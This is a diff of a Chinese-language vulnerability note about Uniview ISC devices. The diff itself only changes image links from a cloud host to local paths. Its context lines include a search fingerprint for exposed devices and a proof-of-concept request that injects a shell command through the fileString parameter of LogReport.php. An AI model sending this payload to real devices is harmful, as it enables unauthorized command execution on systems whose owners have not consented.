@@ -20,7 +20,7 @@ app="uniview-ISC"
 
 登录页面
 
-![image-20220519183432893](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191834953.png)
+![image-20220519183432893](./images/202205191834953.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="uniview-ISC"
 /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>1.txt
 ```
 
-![image-20220519183528302](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191835400.png)
+![image-20220519183528302](./images/202205191835400.png)
